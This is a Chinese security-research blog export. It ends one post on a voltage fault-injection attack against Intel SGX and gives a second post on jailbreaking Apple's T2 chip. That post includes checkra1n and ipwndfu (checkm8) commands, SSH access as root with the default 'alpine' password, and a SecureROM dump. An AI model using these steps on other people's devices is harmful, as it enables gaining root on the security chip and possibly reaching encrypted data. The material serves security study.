<li>3.可信函数被调用，执行会转换到enclave中</li>
<li>4.enclave可以访问所有进程数据，外部要访问encalve数据被禁止</li>
<li>5.可信函数返回enclave数据</li>
<li>6.App进行执行不同代码</li>
</ul>
<h5 id="c-认证enclave和加密数据"><a href="#c-认证enclave和加密数据" class="headerlink" title="c.认证enclave和加密数据"></a>c.认证enclave和加密数据</h5><ul>
<li><p>intel SGX使用enclave之间本地认证或者第三方认证的方式来保证应用程序没有收到破坏</p>
<h6 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h6><ul>
<li>1.intel SGX通过指令生成CPU和enclave特定的密封密钥</li>
<li>2.应用程序受保护的部分会被加载到一个enclave</li>
<li>3.对应的代码和数据都会受到测量</li>
<li>4.将对应的报告发送给远端应用程序拥有着的服务器上</li>
<li>5.验证这个enclave报告是不是一个可靠的intel处理器生成的</li>
<li>6.验证成功远端信任并安全的提供密钥、凭证和数据</li>
</ul>
</li>
</ul>
<h5 id="d-可能存在的攻击面"><a href="#d-可能存在的攻击面" class="headerlink" title="d.可能存在的攻击面"></a>d.可能存在的攻击面</h5><ul>
<li>对enclave未授权访问</li>
<li>对enclave内存侦听</li>
</ul>
<h3 id="5-实现新的安全模型和创新"><a href="#5-实现新的安全模型和创新" class="headerlink" title="5.实现新的安全模型和创新"></a>5.实现新的安全模型和创新</h3><h4 id="intel-SGX使用案例"><a href="#intel-SGX使用案例" class="headerlink" title="intel SGX使用案例"></a>intel SGX使用案例</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">保护应用程序和数据	Tamper-resistant code tool vendors</span><br><span class="line"></span><br><span class="line">保护支付对话以及云和数据安全	Financial services industry (FSI) companies</span><br><span class="line"></span><br><span class="line">加强生物识别; 强化认证	Security authentication companies</span><br><span class="line"></span><br><span class="line">强化浏览器体验	Browser vendors</span><br><span class="line"></span><br><span class="line">强化DRM，增强高清，4K超高清（UHD）内容保护	Content playback ISVs and content owners across over-the-top (OTT) and media services</span><br><span class="line"></span><br><span class="line">加强终端安全性	Security ISVs and OEMs</span><br><span class="line"></span><br><span class="line">保护通信-终端到管理控制台	Security ISVs</span><br><span class="line"></span><br><span class="line">保护电子病历（EMR），敏感和机密数据	Governments and major health care organizations</span><br><span class="line"></span><br><span class="line">保护本地文件系统上的密钥; 强化磁盘保护	Disk encryption ISVs</span><br><span class="line"></span><br><span class="line">保护密钥管理，优化嵌入式应用程序	Cloud, infrastructure, and SaaS providers</span><br><span class="line"></span><br><span class="line">保护TLS密钥库管理	Cloud, content delivery networks, frequency scanning interferometry (FSI), infrastructure, SaaS</span><br><span class="line"></span><br><span class="line">安全的分析工作负载	Big data ISVs and enterprises</span><br><span class="line"></span><br><span class="line">安全的文档共享和查看	Government and secure document sharing ISVs</span><br><span class="line"></span><br><span class="line">飞地优化的嵌入式应用程序	Major defense contractors</span><br><span class="line"></span><br><span class="line">安全的IoT边界设备和云通信	IoT gateway and device manufacturers</span><br></pre></td></tr></table></figure>



<h2 id="0x02实验准备"><a href="#0x02实验准备" class="headerlink" title="0x02实验准备"></a>0x02实验准备</h2><h4 id="1-System"><a href="#1-System" class="headerlink" title="1.System"></a>1.System</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 1.Ubuntu 18.04.3 LTS 64-bit</span><br><span class="line">- 2.Kernel 5.0.0-23-generic</span><br><span class="line">- 3.Intel SGX driver V2.6</span><br><span class="line"></span><br><span class="line">  - https:&#x2F;&#x2F;github.com&#x2F;intel&#x2F;linux-sgx-driver</span><br><span class="line"></span><br><span class="line">- 4.IntelSGX-SDK V 2.8</span><br><span class="line"></span><br><span class="line">  - https:&#x2F;&#x2F;github.com&#x2F;intel&#x2F;linux-sgx</span><br></pre></td></tr></table></figure>

<h4 id="2-Others"><a href="#2-Others" class="headerlink" title="2.Others"></a>2.Others</h4><p>1.Teensy 4.0 Development Board（350¥）</p>
<p>2 *Bus Driver，you can choose between the following</p>
<ul>
<li><p>b.SN74LVC1G07DRLR（7¥）</p>
</li>
<li><p>a.NL17SZ07XV5T2G（1-3¥）</p>
</li>
</ul>
<p>3.SOT IC Adapter（172¥）</p>
<h2 id="0x03攻击方式"><a href="#0x03攻击方式" class="headerlink" title="0x03攻击方式"></a>0x03攻击方式</h2><h3 id="1-选择明文攻击差分攻击获取AES密钥"><a href="#1-选择明文攻击差分攻击获取AES密钥" class="headerlink" title="1.选择明文攻击差分攻击获取AES密钥"></a>1.选择明文攻击差分攻击获取AES密钥</h3><h3 id="2-延迟写攻击"><a href="#2-延迟写攻击" class="headerlink" title="2.延迟写攻击"></a>2.延迟写攻击</h3><p>​        作者发现在拉低电压的情况下会出现写操作延迟，流水线调度出现问题，造成结果错误的问题。</p>
<p>eg：流水线已经执行下一条数据相关的指令但是上段流水的写操作尚未完成，导致计算出错，理论上可以用于绕过密码判断等，也可以造成数据写越界</p>
<h3 id="3-攻击步骤"><a href="#3-攻击步骤" class="headerlink" title="3.攻击步骤"></a>3.攻击步骤</h3><p>1.找到主板上的SVID和电压调节器(VR)</p>
<p>2.通过tenssy和其他的工具，并接在SVID总线上，以进行指令注入</p>
<p>3.执行基于电压的故障注入攻击</p>
<h2 id="0x04-缓解方式"><a href="#0x04-缓解方式" class="headerlink" title="0x04 缓解方式"></a>0x04 缓解方式</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.重新设计协议，增加SVID协议的密码认证</span><br><span class="line"></span><br><span class="line">2.CPU监视总线上的数据包，检测注入的SVID数据包，如果非自己发出的数据包CPU可能依法异常并中止执行</span><br><span class="line"></span><br><span class="line">- 攻击者可以在CPU和VR间充当中间人，隐藏恶意的数据包</span><br><span class="line"></span><br><span class="line">3.检测自身电源电压，如果电压低于以下的值则终止，电压监控电路</span><br><span class="line"></span><br><span class="line">- 不能依赖基于测量CPU电压的缓解措施，SGX不提供信任的方式来访问MSR，因此此类对策都可以通过有问题的操作系统</span><br><span class="line"></span><br><span class="line">4.检测在运行内核上的多个关键代码路径</span><br><span class="line"></span><br><span class="line">- 这种对此对策大量的硬件更改并产生开销</span><br><span class="line"></span><br><span class="line">5.使用完全集成的稳压器（FIVR）</span><br><span class="line"></span><br><span class="line">- 第4代Intel Core SoC（已废弃）</span><br></pre></td></tr></table></figure>



<h2 id="0x05参考链接"><a href="#0x05参考链接" class="headerlink" title="0x05参考链接"></a>0x05参考链接</h2><p><a href="https://www.usenix.org/system/files/sec21summer_chen-zitai.pdf">https://www.usenix.org/system/files/sec21summer_chen-zitai.pdf</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/39976702">https://zhuanlan.zhihu.com/p/39976702</a></p>
<p><a href="https://www.youtube.com/watch?v=5Mr1FCZ7VBQ">https://www.youtube.com/watch?v=5Mr1FCZ7VBQ</a></p>
<p><a href="https://github.com/intel/linux-sgx-driver">https://github.com/intel/linux-sgx-driver</a></p>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>SGX</tag>
      </tags>
  </entry>
  <entry>
    <title>Jailbreak_Apple_T2_Chip的相关研究</title>
    <url>/2020/12/03/IOT/Jailbreak-Apple-T2-Chip%E7%9A%84%E7%9B%B8%E5%85%B3%E7%A0%94%E7%A9%B6/</url>
    <content><![CDATA[<p>先放一张图</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201203175053947.png" alt="image-20201203175053947"></p>
<p>更新中…</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/rfh6qOxsLWInTGKc.jpg" alt="Apple T2 chip"></p>
<h2 id="0x00-Apple-T2-芯片"><a href="#0x00-Apple-T2-芯片" class="headerlink" title="0x00 Apple T2 芯片"></a>0x00 Apple T2 芯片</h2><p>首先什么是<strong>苹果T2芯片</strong>呢苹果官网给出的是：Apple T2 安全芯片是 Apple 设计的第二代定制化 Mac 芯片。通过对其他 Mac 电脑中的几款控制器进行重新设计与整合，例如系统管理控制器、图像信号处理器、音频控制器和 SSD 控制器，T2 芯片为 Mac 带来了多项新功能。</p>
<p>例如，T2 芯片让安全性又上新台阶，它所包含的安全隔区协处理器可保护<a href="https://support.apple.com/zh-cn/HT207054">触控 ID</a> 数据，并为新的<a href="https://support.apple.com/zh-cn/HT208344">加密储存</a>和<a href="https://support.apple.com/zh-cn/HT208330">安全启动</a>功能奠定了基础。此外，T2 芯片的图像信号处理器与 FaceTime 高清摄像头配合，进一步提升色调映射和曝光控制，还能基于面部识别技术进行自动曝光并自动调节白平衡。</p>
<p>总结起来就是说是一个值得信赖的安全芯片。T2保护基本功能，例如安全启动，激活锁，Touch ID，加密数据存储，安全启动，图像信号技术等。</p>
<p><strong>Apple T2安全芯片如何工作？</strong>Apple T2芯片可以控制MacOS的启动过程。它可以确保用户安装Apple认可的驱动器。只要在Mac计算机上按下电源按钮，它就会开始工作，一直持续到您看到MacOS桌面为止。换句话说，其主要功能之一就是验证Apple是否已签署您的操作系统和引导程序。</p>
<p>T2还负责硬盘驱动器上的所有加密数据。在以前的Mac版本中，此功能由CPU执行，从而使其负担沉重。通过将这些功能转移到T2芯片上，Apple大大改善了新Mac的性能。T2为CPU提供了更多资源。该芯片可确保MacBook Air和MacBook Pro中提供的Touch ID功能。这些设备中的指纹扫描仪为用户提供了快速登录选项，并批准了管理员级别的请求。Apple T2芯片有助于安全地存储指纹数据。</p>
<p>它还处理来自不同应用程序的验证请求。T2芯片可确保没有应用程序可以通过Touch ID或Face访问您的指纹信息。当请求验证时，Apple T2安全芯片将指纹与安全区协处理器中保护的数据进行比较，并通知结果。</p>
<h2 id="0x01-具备Apple-T2的设备"><a href="#0x01-具备Apple-T2的设备" class="headerlink" title="0x01 具备Apple T2的设备"></a>0x01 具备Apple T2的设备</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2020 年推出的 iMac</span><br><span class="line">iMac Pro</span><br><span class="line">2019 年推出的 Mac Pro</span><br><span class="line">2018 年推出的 Mac mini</span><br><span class="line">2018 年或之后推出的 MacBook Air</span><br><span class="line">2018 年或之后推出的 MacBook Pro</span><br></pre></td></tr></table></figure>

<p>可以在<strong>“系统信息”</strong>里面查看自己的Mac是否配备了T2芯片</p>
<ol>
<li>在按住 Option 键的同时，选取苹果 () 菜单 &gt;“系统信息”。</li>
</ol>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/macos-about-this-mac-system-report-controller-t2.png" alt="img"></p>
<h3 id="对应的Mac的EMC编号如下"><a href="#对应的Mac的EMC编号如下" class="headerlink" title="对应的Mac的EMC编号如下"></a>对应的Mac的EMC编号如下</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iMac Pro：</span><br><span class="line">EMC – 3144（型号A1862 – 2017）</span><br><span class="line"></span><br><span class="line">Mac Pro：</span><br><span class="line">EMC – 3203（模型A1991 – 2019）</span><br><span class="line">EMC – 3413（A2304型（机架）– 2019年）</span><br><span class="line"></span><br><span class="line">Mac Mini：</span><br><span class="line">EMC – 3213（模型A1993 – 2018）</span><br><span class="line">EMC – TBD（TBD型号– 2020）</span><br><span class="line"></span><br><span class="line">MacBook Pro：</span><br><span class="line">EMC – 3214（模型A1989 – 2018）</span><br><span class="line">EMC – 3215（型号A1990 – 2018）</span><br><span class="line">EMC – 3358（A1989型– 2019年）</span><br><span class="line">EMC – 3359（型号A1990 – 2019）</span><br><span class="line">EMC – 3301（型号A2159 – 2019）</span><br><span class="line">EMC – 3347（型号A2141 – 2019）</span><br><span class="line">EMC – 3348（型号A2251 – 2020）</span><br><span class="line">EMC – 3456（型号A2289 – 2020）</span><br><span class="line"></span><br><span class="line">MacBook Air：</span><br><span class="line">EMC – 3184（型号A1932 – 2018和2019）</span><br><span class="line">EMC – 3302（型号A2179 – 2020）</span><br></pre></td></tr></table></figure>

<h3 id="以下模型容易受到攻击"><a href="#以下模型容易受到攻击" class="headerlink" title="以下模型容易受到攻击"></a>以下模型容易受到攻击</h3><table>
<thead>
<tr>
<th><strong>iBridge产品编号</strong></th>
<th><strong>板号</strong></th>
<th>board minor</th>
<th><strong>说明（产品编号）</strong></th>
<th><strong>checkm8 / blackbird确认</strong></th>
</tr>
</thead>
<tbody><tr>
<td>iBridge2,1</td>
<td>J137AP</td>
<td>0x0A</td>
<td>苹果T2 iMacPro1,1（j137）</td>
<td>是</td>
</tr>
<tr>
<td>iBridge2,3</td>
<td>J680AP</td>
<td>0x0B</td>
<td>苹果T2 MacBookPro15,1（j680）</td>
<td>是</td>
</tr>
<tr>
<td>iBridge2,4</td>
<td>J132AP</td>
<td>0x0C</td>
<td>苹果T2 MacBookPro15,2（j132）</td>
<td>是</td>
</tr>
<tr>
<td>iBridge2,5</td>
<td>J174AP</td>
<td>0x0E</td>
<td>苹果T2 Macmini8,1（j174）</td>
<td>是</td>
</tr>
<tr>
<td>iBridge2,6</td>
<td>J160AP</td>
<td>0x0F</td>
<td>苹果T2 MacPro7,1（j160）</td>
<td>是</td>
</tr>
<tr>
<td>iBridge2,7</td>
<td>J780AP</td>
<td>0x07</td>
<td>苹果T2 MacBookPro15,3（j780）</td>
<td>是</td>
</tr>
<tr>
<td>iBridge2,8</td>
<td>J140kAP</td>
<td>0x17</td>
<td>苹果T2 MacBookAir8,1（j140k）</td>
<td>是</td>
</tr>
<tr>
<td>iBridge2,10</td>
<td>J213AP</td>
<td>0x18</td>
<td>苹果T2 MacBookPro15,4（j213）</td>
<td>是</td>
</tr>
<tr>
<td>iBridge2,11</td>
<td>J230AP</td>
<td>0x1F</td>
<td>？</td>
<td>？</td>
</tr>
<tr>
<td>iBridge2,12</td>
<td>J140aAP</td>
<td>0x37</td>
<td>苹果T2 MacBookAir8,2（j140a）</td>
<td>是</td>
</tr>
<tr>
<td>iBridge2,13</td>
<td>J214AP</td>
<td>0x1E</td>
<td>？</td>
<td>？</td>
</tr>
<tr>
<td>iBridge2,14</td>
<td>J152fAP</td>
<td>0x3A</td>
<td>苹果T2 MacBookPro16,1（j152f）</td>
<td>是</td>
</tr>
<tr>
<td>iBridge2,15</td>
<td>J230kAP</td>
<td>0x3F</td>
<td>苹果T2 MacBookAir9,1（j223k）</td>
<td>是</td>
</tr>
<tr>
<td>iBridge2,16</td>
<td>J214kAP</td>
<td>0x3E</td>
<td>？</td>
<td>？</td>
</tr>
<tr>
<td>iBridge2,19</td>
<td>J185AP</td>
<td>0x22</td>
<td>？</td>
<td>？</td>
</tr>
<tr>
<td>iBridge2,20</td>
<td>J185fAP</td>
<td>0x23</td>
<td>？</td>
<td>？</td>
</tr>
<tr>
<td>iBridge2,21</td>
<td>J223AP</td>
<td>0x3B</td>
<td>？</td>
<td>？</td>
</tr>
<tr>
<td>iBridge2,22</td>
<td>J215AP</td>
<td>0x38</td>
<td>？</td>
<td>？</td>
</tr>
</tbody></table>
<h2 id="0x02-T2芯片的MacOS安全启动过程"><a href="#0x02-T2芯片的MacOS安全启动过程" class="headerlink" title="0x02 T2芯片的MacOS安全启动过程"></a>0x02 T2芯片的MacOS安全启动过程</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 即使Mac设备已关闭，T2芯片也已完全启动并保持开启状态。</span><br><span class="line"></span><br><span class="line">2. 按下电源按钮或打开机盖会触发系统管理控制器（SMC）引导。</span><br><span class="line"></span><br><span class="line">3. SMC执行加电自检（POST），以检测任何EFI或硬件问题，例如RAM损坏，并可能重定向到Recovery。</span><br><span class="line"></span><br><span class="line">4. 在进行了基本的健康检查之后，将触发T2芯片并设置I &#x2F; O连接器。（USB，NVMe，PCIe等），它将使用NVMe和PCIe与NAND存储进行通信。</span><br><span class="line"></span><br><span class="line">5. 选择适用的启动磁盘，然后询问是否启用了磁盘加密密码以 可能通过FileVault2磁盘加密来挂载 [APFS](https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Apple_File_System)卷。</span><br><span class="line"></span><br><span class="line">6. &#x2F;System&#x2F;Library&#x2F;CoreServices&#x2F;boot.efi位于系统APFS卷上，并且 [根据您的安全启动设置 ](https:&#x2F;&#x2F;support.apple.com&#x2F;en-us&#x2F;HT208330)进行了验证。</span><br><span class="line"></span><br><span class="line">7. 运行boot.efi来加载Darwin内核（回退到BSD）（如果启动Microsoft Windows，则启动Boot Camp）和IODevice驱动程序。如果在&#x2F; System &#x2F; Library &#x2F; PrelinkedKernels &#x2F; prelinkedkernel中找到了内核缓存，它将使用该缓存。</span><br><span class="line"></span><br><span class="line">8. 如果用户批准的内核扩展已被T2芯片批准，则将其初始化并添加到内核空间。这将随着系统扩展而消失。</span><br></pre></td></tr></table></figure>



<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/macOS-secure-booting.png" alt="img"></p>
<h2 id="0x03-越狱步骤"><a href="#0x03-越狱步骤" class="headerlink" title="0x03 越狱步骤"></a>0x03 越狱步骤</h2><h4 id="需要设备："><a href="#需要设备：" class="headerlink" title="需要设备："></a>需要设备：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.一台带有T2芯片的Mac</span><br><span class="line">2.另一个MacOS（不知道虚拟机是否可以）；</span><br><span class="line">3.USB-C至USB-C电缆。Macbook附带的就可以。</span><br></pre></td></tr></table></figure>

<h4 id="1-从官方网站下载最新版本的Checkra1n-T2越狱工具。"><a href="#1-从官方网站下载最新版本的Checkra1n-T2越狱工具。" class="headerlink" title="1.从官方网站下载最新版本的Checkra1n T2越狱工具。"></a>1.从<a href="https://checkra.in/releases/">官方网站</a>下载最新版本的Checkra1n T2越狱工具。</h4><p>​    <a href="https://checkra.in/releases/">https://checkra.in/releases/</a></p>
<h4 id="2-将Mac置于DFU模式。"><a href="#2-将Mac置于DFU模式。" class="headerlink" title="2.将Mac置于DFU模式。"></a>2.将Mac置于DFU模式。</h4><p>如何进入MacOS DFU模式](<a href="https://checkm8.info/blog/dfu-mode-mac">https://checkm8.info/blog/dfu-mode-mac</a>)</p>
<p>如何置于DFU模式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.需要两台电脑</span><br><span class="line">2.Apple Configurator 2</span><br><span class="line">3.usb-c线插到电脑左侧第二个接口</span><br><span class="line">4.按住电源按钮1s</span><br><span class="line">5.同时按住左control、左option和右shift 持续8s</span><br><span class="line">6.Configurator 2显示为DFU模式</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/aeb34551b54ee063316ea5c98f7c617e.png" alt="Apple Configurator 2 显示 Mac进入了DFU模式"></p>
<p>检查设备是否已经进入DFU模式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ioregg -p IOUSB</span><br></pre></td></tr></table></figure>

<h4 id="3-使用CLI，Checkra1n的命令行版本"><a href="#3-使用CLI，Checkra1n的命令行版本" class="headerlink" title="3.使用CLI，Checkra1n的命令行版本"></a>3.使用CLI，Checkra1n的命令行版本</h4><p><strong>Checkra1n GUI版本0.11.0不支持T2越狱。</strong></p>
<p>如果用Checkra1n工具连接带有T2的Mac，会报以下错误</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Sorry, your device is not supported.</span><br></pre></td></tr></table></figure>

<h4 id><a href="#" class="headerlink" title></a></h4><p>在Finder中打开Checkra1n应用程序，然后右键单击它以查看“显示包装内容”菜单</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/macbook-jailbreak.png" alt="img" style="zoom:50%;">

<p>现在转到文件夹<code>Contents =&gt; MacOS</code>。可以看到Checkra1n二进制文件。打开终端应用程序，然后将二进制文件拖放到<code>&quot;Terminal.&quot;</code></p>
<p>或者，如果将Checkra1n应用程序放入“应用程序”文件夹，则可以在以下命令中键入以下命令 <code>&quot;Terminal:&quot;</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;Applications&#x2F;checkra1n.app&#x2F;Contents&#x2F;MacOS&#x2F;checkra1n</span><br></pre></td></tr></table></figure>

<h4 id="4-通过-c来启动命令行版本"><a href="#4-通过-c来启动命令行版本" class="headerlink" title="4.通过-c来启动命令行版本"></a>4.通过-c来启动命令行版本</h4><p>同时开启 -v 来检查越狱日志</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;Applications&#x2F;checkra1n.app&#x2F;Contents&#x2F;MacOS&#x2F;checkra1n -c -v</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/macbook-jailbreak-t2-20201126102132819.png" alt="img"></p>
<p>如果报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Timed out waiting for bootstrap upload (error code: -20)</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/macbook-jailbreak-t2-chip-20201126102147333.png" alt="img"></p>
<p>在这种情况下，请重新启动Checkra1n CLI工具，直到看到引导程序成功安装的消息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">: Bootstrap already installed, done</span><br></pre></td></tr></table></figure>

<p>可能需要重试几次才能完成。</p>
<h4 id="5-通过SSH进入越狱的Apple-T2芯片"><a href="#5-通过SSH进入越狱的Apple-T2芯片" class="headerlink" title="5.通过SSH进入越狱的Apple T2芯片"></a>5.通过SSH进入越狱的Apple T2芯片</h4><p>成功越狱之后打开一个新的终端窗口，然后输入以下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iproxy 2222 44</span><br></pre></td></tr></table></figure>

<p>不要关闭此窗口并再打开一个终端窗口<code>(Command + T)</code>。输入此命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh root@localhost -p 2222</span><br></pre></td></tr></table></figure>

<p>密码是： <code>alpine</code></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/macbook-jailbreak-t2-security-chip.png" alt="img"></p>
<h2 id="0x04-具体原理"><a href="#0x04-具体原理" class="headerlink" title="0x04 具体原理"></a>0x04 具体原理</h2><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201202201030024.png" alt="image-20201202201030024" style="zoom:50%;">

<p>在Twitter和Reddit上已经提到由于T2芯片和iPhone及其底层硬件之间共享某些硬件和软件功能。从而通过结合最初为越狱的iphone开发的checkm8 + blackbird两个漏洞相结合可以越狱T2安全芯片的Mac和Macbook设备</p>
<p>根据 <a href="https://ironpeak.be/blog/crouching-t2-hidden-danger/">比利时安全公司ironPeak的帖子</a>，越狱T2安全芯片涉及通过USB-C连接到Mac / MacBook，并 在Mac的启动过程中运行<a href="https://checkra.in/">Checkra1n越狱软件</a>的<a href="https://checkra.in/">0.11.0</a>版本 。</p>
<p>根据ironPeak的说法，这之所以奏效，是因为“ Apple在向客户提供的T2安全芯片中未打开调试界面，允许任何人无需身份验证即可进入设备固件更新（DFU）模式。”</p>
<p>ironPeak说：“使用这种方法，可以创建一条USB-C电缆，该电缆可以在启动时自动利用您的macOS设备。”</p>
<p>这使攻击者可以在T2芯片上获得root用户访问权限，并修改和控制目标设备上运行的所有内容，甚至可以恢复加密的数据。</p>
<h3 id="1-Checkm8"><a href="#1-Checkm8" class="headerlink" title="1.Checkm8"></a>1.Checkm8</h3><p>一句话描述漏洞：对USB请求处理不当造成的UAF漏洞。手里有一个iphone5s，所以决定研究一下checkm8这个漏洞。</p>
<h4 id="上手尝试"><a href="#上手尝试" class="headerlink" title="上手尝试"></a>上手尝试</h4><p>在分析这个漏洞之前，先对checkm8有一个感性直观的认识，我们首先动动手，做俩实验：分别是使用checkra1n越狱，以及使用ipwndfu提取固化在处理器芯片中的固件代码(SecureROM)。不过在动手之前，先阅读以下写给科技爱好者的文章和广大网友对这个漏洞的讨论：</p>
<ul>
<li><a href="https://new.qq.com/omn/20190929/20190929A0QNVW00.html">苹果现史诗级漏洞：iPhone可永久越狱，库克却束手无策！</a></li>
<li><a href="https://www.expreview.com/70777.html">有问有答：为什么说这次苹果A系列处理器中的BootROM漏洞是史诗级的？</a></li>
<li><a href="https://www.zhihu.com/question/348168793">如何看待苹果 A5-A11 芯片的「史诗级越狱漏洞」Checkm8？影响有多大？</a></li>
</ul>
<h4 id="checkra1n-越狱"><a href="#checkra1n-越狱" class="headerlink" title="checkra1n 越狱"></a>checkra1n 越狱</h4><p>使用<a href="https://checkra.in/">checkra1n</a>，基本就是傻瓜操作。不过与普通越狱不同的是，在使用这个工具越狱后，并不需要安装cydia，即可在爱思助手直接开始ssh通道。ssh通道这个功能是将手机的22端口通过usb映射到电脑主机的端口，第一次用可能会迷糊。默认的用户名密码是：<code>root:alpine</code>，如果不熟悉越狱和ssh流程，可以参考如下文章：</p>
<ul>
<li><a href="https://www.jianshu.com/p/aa007c10a7a1?from=singlemessage">IOS 13.3 checkRa1n 越狱</a></li>
<li><a href="http://www.veryitman.com/2018/05/12/iOS-逆向-越狱使用-SSH/">iOS 逆向: 越狱使用 SSH</a></li>
</ul>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201203102556462.png" alt="image-20201203102556462" style="zoom:50%;">



<p>另外发现ssh虽然开启，也可以由外部连入本机的22端口，但是并不能本机自己连自己，即并不能在手机上安装一个ssh客户端软件来访问自己的shell，这里苹果做了限制，绕过方式是修改ssh服务端口并重启，参考如下：</p>
<ul>
<li><a href="https://www.jianshu.com/p/a2c02b8c27f5">iOS 已越的设备SSH localhost</a></li>
<li><a href="https://apple.stackexchange.com/questions/159361/unable-to-ssh-rootlocalhost-on-jailbroken-ipad-with-ios-8-1">Unable to ssh root@localhost on jailbroken iPad with iOS 8.1</a></li>
</ul>
<h4 id="ipwndfu-提取-SecureROM"><a href="#ipwndfu-提取-SecureROM" class="headerlink" title="ipwndfu 提取 SecureROM"></a>ipwndfu 提取 SecureROM</h4><p>使用<a href="https://github.com/axi0mX/ipwndfu/">ipwndfu</a>完成dump固件。但是其并不是对任何iPhone都支持，在readme中可见支持说明：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">current SoC support: s5l8947x, s5l8950x, s5l8955x, s5l8960x, t8002, t8004, t8010, t8011, t8015</span><br><span class="line">future SoC support: s5l8940x, s5l8942x, s5l8945x, s5l8747x, t7000, t7001, s7002, s8000, s8001, s8003, t8012</span><br></pre></td></tr></table></figure>

<p>这些SoC版本对应的苹果设备型号可以参考：<a href="https://www.theiphonewiki.com/，可见iPhone5s是s5l8960刚好可以，然后我们将手机置于DFU模式，方法参考">https://www.theiphonewiki.com/，可见iPhone5s是s5l8960刚好可以，然后我们将手机置于DFU模式，方法参考</a></p>
<p><a href="https://www.i4.cn/news_detail_30618.html">iPhone 进恢复模式和 DFU 模式有什么区别？</a>，iPhone 5s 进入DFU 模式的方法：<br>1、打开iTune<br>2、按住苹果顶部的power键3秒;<br>3、不要松开power键同时按住home键10秒;<br>4、松开power键继续按住home键，一直到iTunes会自动检测到出于恢复模式的iPhone后再松开</p>
<p>安装libusb</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brew install libusb</span><br></pre></td></tr></table></figure>

<p>然后在ipwndfu目录<code>./ipwndfu -p</code>完成后门的植入，如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ .&#x2F;ipwndfu -p                                                                                                                             127 ↵</span><br><span class="line">*** checkm8 exploit by axi0mX ***</span><br><span class="line">Found: CPID:8960 CPRV:11 CPFM:03 SCEP:01 BDID:02 ECID:00000635CB274B30 IBFL:1C SRTG:[iBoot-1704.10]</span><br><span class="line">Device is now in pwned DFU Mode.</span><br><span class="line">(13.54 seconds)</span><br></pre></td></tr></table></figure>

<p>成功之后即可在电脑的【关于本机】-&gt; 【系统报告】的USB设备详细信息中看到手机的USB序列号已经被更改：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201203111159468.png" alt="image-20201203111159468"></p>
<p>然后dump固件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ sudo .&#x2F;ipwndfu --dump-rom</span><br><span class="line">Saved: SecureROM-s5l8960xsi-1704.10-RELEASE.dump</span><br></pre></td></tr></table></figure>

<p>可以与<a href="https://securerom.fun/这里下载的固件进行比对，经测试，固件是一致的。">https://securerom.fun/这里下载的固件进行比对，经测试，固件是一致的。</a></p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><ul>
<li><a href="https://zhuanlan.zhihu.com/p/87456653">iPhone史诗级漏洞checkm8攻击原理浅析</a></li>
<li><a href="https://m.habr.com/en/company/dsec/blog/472762/">Technical analysis of the checkm8 exploit</a></li>
<li><a href="https://www.anquanke.com/post/id/187864">iPhone BootROM 漏洞说明及威胁评估</a></li>
<li><a href="https://iokit.racing/oneweirdtrick.pdf">The One Weird Trick SecureROM Hates</a></li>
</ul>
<h5 id="iBoot源码泄露事件"><a href="#iBoot源码泄露事件" class="headerlink" title="iBoot源码泄露事件"></a>iBoot源码泄露事件</h5><blockquote>
<p>这是一切的开始。</p>
</blockquote>
<p>让我们来看一条2018年2月8日的新闻：<a href="https://mp.weixin.qq.com/s/YrZPxHttM4qoVgqz1YApJw">史上最大源码泄露事件：iOS 关键源代码被匿名公布在 GitHub 上</a>，再来看看当时的中国网民怎么说：</p>
<ul>
<li><a href="https://www.zhihu.com/question/266880039">iOS9源码泄露,是真的么?</a></li>
<li><a href="https://www.zhihu.com/question/266898229">如何看待 2018 年 2 月 8 日iBoot源代码泄漏事件？</a></li>
</ul>
